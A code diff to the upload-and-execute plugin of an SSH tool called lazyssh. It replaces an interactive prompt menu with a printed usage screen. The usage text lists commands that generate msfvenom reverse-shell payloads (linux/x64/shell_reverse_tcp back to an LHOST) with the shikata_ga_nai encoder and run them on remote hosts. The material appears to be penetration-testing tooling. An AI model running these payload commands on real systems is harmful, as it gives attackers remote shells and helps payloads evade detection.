@@ -8,7 +8,7 @@
 
 Supports uploading local binaries, generating msfvenom payloads for the
 detected remote architecture, and executing them via the SSH control socket.
-Provides both CLI and interactive modes.
+All operations are driven by CLI arguments passed from the plugin runner.
 """
 
 from __future__ import annotations
@@ -23,13 +23,6 @@ import tempfile
 from dataclasses import dataclass
 
 from lazyssh.console_instance import console
-
-try:  # pragma: no cover - Rich may be unavailable
-    from rich.prompt import Confirm, IntPrompt, Prompt
-except Exception:  # pragma: no cover
-    Confirm = None  # type: ignore[assignment,misc]
-    Prompt = None  # type: ignore[assignment,misc]
-    IntPrompt = None  # type: ignore[assignment,misc]
 
 try:  # pragma: no cover - logging may be unavailable when packaged separately
     from lazyssh.logging_module import APP_LOGGER
@@ -362,89 +355,58 @@ def msfvenom_mode(
 
 
 # ---------------------------------------------------------------------------
-# Interactive mode
+# Usage display (non-interactive)
 # ---------------------------------------------------------------------------
 
 
-def _interactive_mode(arch: RemoteArch) -> int:
-    """Run interactive menu for upload-exec operations."""
-    if Prompt is None or Confirm is None or IntPrompt is None:
-        console.print("[error]Interactive mode requires Rich — use CLI arguments instead[/error]")
-        return 1
+def _show_usage(arch: RemoteArch) -> int:
+    """Print usage information with detected remote architecture."""
+    console.print("\n[panel.title]Upload & Execute Plugin[/panel.title]")
+    console.print(f"  Remote arch: {arch.raw_arch} ({arch.msf_arch})")
+    console.print(f"  Remote OS:   {arch.raw_os} ({arch.msf_platform})\n")
 
-    console.print("\n[panel.title]Remote System[/panel.title]")
-    console.print(f"  Architecture: {arch.raw_arch} ({arch.msf_arch})")
-    console.print(f"  OS:           {arch.raw_os} ({arch.msf_platform})\n")
+    console.print("[bold]Usage:[/bold]  plugin run upload-exec <socket> [options]\n")
 
-    choice = Prompt.ask(
-        "Select mode",
-        choices=["upload", "msfvenom", "upload-only"],
-        default="upload",
+    console.print("[header]Upload & Execute a Local Binary:[/header]")
+    console.print("  plugin run upload-exec myserver /path/to/binary")
+    console.print("  plugin run upload-exec myserver /path/to/binary --args '--flag value'")
+    console.print("  plugin run upload-exec myserver /path/to/binary --background")
+    console.print("  plugin run upload-exec myserver /path/to/binary --no-cleanup")
+    console.print("  plugin run upload-exec myserver /path/to/binary --timeout 60")
+    console.print("  plugin run upload-exec myserver /path/to/binary --output-file out.txt")
+    console.print("  plugin run upload-exec myserver /path/to/binary --dry-run\n")
+
+    console.print("[header]Generate & Upload msfvenom Payload:[/header]")
+    console.print("  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1")
+    console.print("  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1 --lport 5555")
+    console.print(
+        "  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1"
+        " --payload linux/x64/shell_reverse_tcp"
+    )
+    console.print(
+        "  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1"
+        " --encoder x86/shikata_ga_nai --iterations 3"
+    )
+    console.print(
+        "  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1 --background --dry-run\n"
     )
 
-    if choice == "upload":
-        file_path = Prompt.ask("Local file path")
-        if not file_path or not os.path.isfile(file_path):
-            console.print(f"[error]File not found: {file_path}[/error]")
-            return 1
-        remote_args = Prompt.ask("Arguments (optional)", default="")
-        bg = Confirm.ask("Run in background?", default=False)
-        cleanup = not Confirm.ask("Keep file after execution?", default=False)
-        return upload_and_execute(
-            file_path,
-            remote_args=remote_args,
-            no_cleanup=not cleanup,
-            background=bg,
-        )
+    console.print("[header]Options:[/header]")
+    console.print("  --args TEXT          Arguments for remote binary")
+    console.print("  --no-cleanup         Keep file on remote after execution")
+    console.print("  --background         Execute in background (nohup)")
+    console.print("  --timeout SECS       Execution timeout (default: 300)")
+    console.print("  --output-file PATH   Save remote output to local file")
+    console.print("  --msfvenom           Generate msfvenom payload instead of uploading a file")
+    console.print("  --payload TEXT       Override msfvenom payload string")
+    console.print("  --lhost IP           LHOST for msfvenom (required with --msfvenom)")
+    console.print("  --lport PORT         LPORT for msfvenom (default: 4444)")
+    console.print("  --encoder TEXT       Msfvenom encoder")
+    console.print("  --iterations N       Encoder iterations (default: 1)")
+    console.print("  --format FMT         Output format: elf, raw, py, sh (default: elf)")
+    console.print("  --dry-run            Show plan without executing\n")
 
-    elif choice == "msfvenom":
-        if not shutil.which("msfvenom"):
-            console.print("[error]msfvenom not found in PATH[/error]")
-            return 1
-
-        preset = PAYLOAD_PRESETS.get(arch.msf_arch, "")
-        payload = Prompt.ask("Payload", default=preset)
-        lhost = Prompt.ask("LHOST (your IP)")
-        lport = IntPrompt.ask("LPORT", default=4444)
-        encoder_input = Prompt.ask("Encoder (optional, press Enter to skip)", default="")
-        encoder = encoder_input if encoder_input else None
-        iterations = 1
-        if encoder:
-            iterations = IntPrompt.ask("Encoder iterations", default=1)
-        fmt = Prompt.ask("Format", choices=["elf", "raw", "py", "sh"], default="elf")
-        bg = Confirm.ask("Run payload in background?", default=True)
-
-        return msfvenom_mode(
-            arch,
-            payload=payload,
-            lhost=lhost,
-            lport=lport,
-            encoder=encoder,
-            iterations=iterations,
-            fmt=fmt,
-            background=bg,
-        )
-
-    else:  # upload-only
-        file_path = Prompt.ask("Local file path")
-        if not file_path or not os.path.isfile(file_path):
-            console.print(f"[error]File not found: {file_path}[/error]")
-            return 1
-
-        ok, staging = _create_staging_dir()
-        if not ok:
-            return 1
-
-        filename = os.path.basename(file_path)
-        remote_path = f"{staging}/{filename}"
-        console.print(f"[info]Uploading {filename} to {remote_path}...[/info]")
-        if _scp_upload(file_path, remote_path):
-            console.print(f"[success]Uploaded to {remote_path}[/success]")
-            return 0
-        console.print("[error]Upload failed[/error]")
-        return 1
-
-    return 0  # pragma: no cover - unreachable fallthrough
+    return 0
 
 
 # ---------------------------------------------------------------------------
@@ -503,9 +465,9 @@ def main() -> int:  # pragma: no cover - CLI entry point
         console.print(f"[error]Architecture detection failed: {exc}[/error]")
         return 1
 
-    # No arguments at all → interactive mode
+    # No arguments at all → show usage with detected architecture
     if args.file_path is None and not args.msfvenom:
-        return _interactive_mode(arch)
+        return _show_usage(arch)
 
     # Msfvenom mode
     if args.msfvenom:
